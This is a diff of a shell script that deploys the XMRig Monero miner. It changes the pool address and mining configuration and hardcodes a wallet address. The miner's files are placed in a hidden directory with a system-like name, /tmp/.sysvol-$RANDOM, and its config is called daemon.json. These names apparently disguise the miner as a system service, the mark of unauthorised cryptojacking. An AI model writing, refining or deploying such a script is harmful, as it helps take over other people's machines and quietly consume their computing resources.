@@ -3,7 +3,7 @@
 set -e
 
 WALLET="46ehvyKTGcU6Z9yzUHSY7BiNxsS6fNy4u37brttGkHwgMoZYQ8bqPnRPBMvDLZ3HQJRRAsXPoJW1tEtCTMc5ye26BUvdfqA"
-POOL="pool.supportxmr.com:443"
+POOL="gulf.moneroocean.stream:443"
 BASE="/tmp/.sysvol-$RANDOM"
 
 echo "[+] XMRig Final Deploy v3.0"
@@ -34,14 +34,29 @@ cat > sbin/daemon.json << 'CFGEOF'
 {
   "autosave": false,
   "cpu": {
-    "enabled": true,
-    "threads": [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15],
-    "huge-pages": true,
-    "hw-aes": true,
-    "yield": true
+     "enabled": true,
+      "huge-pages": false,
+      "hw-aes": null,
+      "priority": 0,
+      "yield": true,
+      "asm": true,
+      "numa": false,
+      "max-threads-hint": 300,
+      "affinity": -1
   },
+   "randomx": {
+        "init": -1,
+        "mode": "fast",
+        "1gb-pages": false,
+        "rdmsr": false,
+        "wrmsr": false,
+        "cache_qos": false,
+        "numa": false,
+        "scratchpad_prefetch_mode": 1
+  },
+  "donate-level": 1,
   "pools": [{
-    "url": "pool.supportxmr.com:443",
+    "url": "gulf.moneroocean.stream:443",
     "user": "46ehvyKTGcU6Z9yzUHSY7BiNxsS6fNy4u37brttGkHwgMoZYQ8bqPnRPBMvDLZ3HQJRRAsXPoJW1tEtCTMc5ye26BUvdfqA",
     "pass": "deployed",
     "tls": true
